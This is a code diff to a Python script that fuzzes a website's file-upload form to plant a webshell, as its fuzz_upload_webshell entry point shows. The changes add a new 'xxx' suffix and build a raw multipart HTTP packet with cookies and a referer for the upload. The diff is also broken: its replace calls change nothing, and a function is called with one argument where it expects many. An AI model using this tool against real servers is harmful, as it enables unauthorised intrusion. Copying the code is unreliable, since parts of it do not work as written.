@@ -118,14 +118,17 @@ def post_multipart_form_data(url, cookie, form_data_dict, boundary, form_file_pa
 
 
 def get_work_file_info(url, cookie, form_data_dict, boundary, form_file_param_name):
-    file_suffix_list = ['jpg', 'png', 'gif', 'txt']
+    file_suffix_list = ['jpg', 'png', 'gif', 'txt','xxx']
     for file_suffix in file_suffix_list:
         filename = "test.%s" % file_suffix
         if file_suffix == 'jpg':
             file_content = jpg_file_content
             content_type = 'image/jpeg'
-            rsp = post_multipart_form_data(
-                url, cookie, form_data_dict, boundary, form_file_param_name, file_content, filename, content_type)
+            packet=origin_packet
+            packet=packet.replace('filename="test.jpeg"','filename="test.jpeg"')
+            packet=packet.replace("Content-Type: image/jpeg","Content-Type: image/jpeg")
+            packet=packet.replace("Content-Type: image/jpeg","Content-Type: image/jpeg")
+            rsp = post_multipart_form_data(packet)
             if rsp['code'] == 200:
                 return {'file_suffix': 'jpg', 'content_type': 'image/jpeg', 'file_content': jpg_file_content}
         elif file_suffix == 'png':
@@ -394,6 +397,28 @@ form_file_param_name = info['form_file_param_name']
 origin_html = info['origin_html']
 boundary = '-------------------------7df3069603d6'
 
+
+origin_packet='''User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:51.0) Gecko/20100101 Firefox/51.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+Referer: %s,
+Cookie: %s,
+Connection: close
+Upgrade-Insecure-Requests: 1
+Content-Type: multipart/form-data; boundary=%s''' % (url,cookie,boundary)
+data=[]
+for key in form_data_dict:
+    data.append('--%s\r\n' % boundary)
+    value = form_data_dict[key]
+    data.append('Content-Disposition: form-data; name="%s"\r\n\r\n' % key)
+    data.append(value + "\r\n")
+    data.append('--%s\r\n' % boundary)
+    data.append('Content-Disposition: form-data; name="%s"; filename="test.jpg"\r\n' % (form_file_param_name))
+    data.append('Content-Type: image/jpeg\r\n\r\n') 
+    data.append(jpg_file_content + "\r\n")
+data.append('--%s--' % boundary)
+data = ''.join(data)
+origin_packet=origin_packet.replace("\n","\r\n")+"\r\n"+data
 
 if __name__ == "__main__":
     fuzz_upload_webshell()
